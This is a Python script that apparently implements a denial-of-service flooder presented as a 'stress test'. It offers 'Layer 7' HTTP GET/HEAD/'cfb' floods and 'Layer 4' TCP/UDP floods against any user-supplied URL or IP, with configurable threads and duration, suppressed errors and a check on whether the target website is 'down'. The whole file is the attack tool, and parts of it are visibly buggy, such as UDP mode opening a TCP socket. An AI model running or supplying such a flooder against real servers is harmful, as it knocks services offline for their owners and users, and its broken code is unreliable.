import aiohttp
import socket
import threading
import asyncio
import time
from colorama import Fore, Style, init

init()

print("Layer 7: get, head, cfb")
print("Layer 4: tcp, udp")
protocol = input("Enter the method to use:")

if protocol in ["get", "head", "cfb"]:
    url = input("Enter the website URL (including http or https): ")
elif protocol in ["tcp", "udp"]:
    ip = input("Enter the IP address of the server: ")
    port = int(input("Enter the port number: "))

num_threads = int(input("Enter the number of threads to use: "))
duration = int(input("Enter the duration of the stress test in seconds: "))

if protocol == "udp":
    packet_size = 65507  # Maximum size for a UDP packet
elif protocol == "tcp":
    packet_size = 65535  # Maximum size for a TCP packet

packet_counter = 0
packet_counter_lock = threading.Lock()

async def stress_test(thread_id):
    global packet_counter

    if protocol == "cfb":
        async with aiohttp.ClientSession() as session:
            await make_http_request(session)
    elif protocol in ["get", "head"]:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            await make_http_request(session)
    elif protocol in ["tcp", "udp"]:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    else:
        print(Fore.RED + f"Invalid protocol: {protocol}" + Style.RESET_ALL)
        return

    start_time = time.time()
    last_print_time = start_time - 9
    if thread_id == 0:
        if protocol in ["get", "head", "cfb"]:
            print(Fore.YELLOW + f"Stress testing started on {url} successfully!" + Style.RESET_ALL)
        elif protocol in ["tcp", "udp"]:
            print(Fore.YELLOW + f"Stress testing started on {ip}:{port} successfully!" + Style.RESET_ALL)
    while time.time() - start_time < duration:
        if protocol in ["tcp", "udp"]:
            send_packet(sock)
            with packet_counter_lock:
                packet_counter += 1
        if thread_id == 0 and time.time() - last_print_time >= 10:
            with packet_counter_lock:
                if protocol in ["get", "head", "cfb"]:
                    try:
                        response_start_time = time.time()
                        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                            response = await session.get(url)
                            response_end_time = time.time()
                            response_time = round((response_end_time - response_start_time) * 1000, 2)
                            print(Fore.GREEN + f"Website is up. Response time: {response_time} ms." + Style.RESET_ALL)
                    except Exception as e:
                        print(Fore.RED + f"Website is down." + Style.RESET_ALL)
                elif protocol in ["tcp", "udp"]:
                    print(f"Sent {packet_counter} packets to {ip}:{port}")
                last_print_time = time.time()

def send_packet(sock):
    try:
        if protocol == "tcp":
            sock.connect((ip, port))
            sock.send(b"X" * packet_size)  # Send a packet with maximum size
            sock.close()
        elif protocol == "udp":
            sock.sendto(b"X" * packet_size, (ip, port))  # Send a packet with maximum size
    except Exception as e:
        pass

async def make_http_request(session):
    try:
        if protocol == "get":
            async with session.get(url) as response:
                pass
        elif protocol == "head":
            async with session.head(url) as response:
                pass
    except Exception as e:
        pass  # Suppress error messages

async def main():
    tasks = []
    for i in range(num_threads):
        task = asyncio.create_task(stress_test(i))
        tasks.append(task)

    await asyncio.gather(*tasks)

asyncio.run(main())

print(Fore.YELLOW + "Stress test ended." + Style.RESET_ALL)
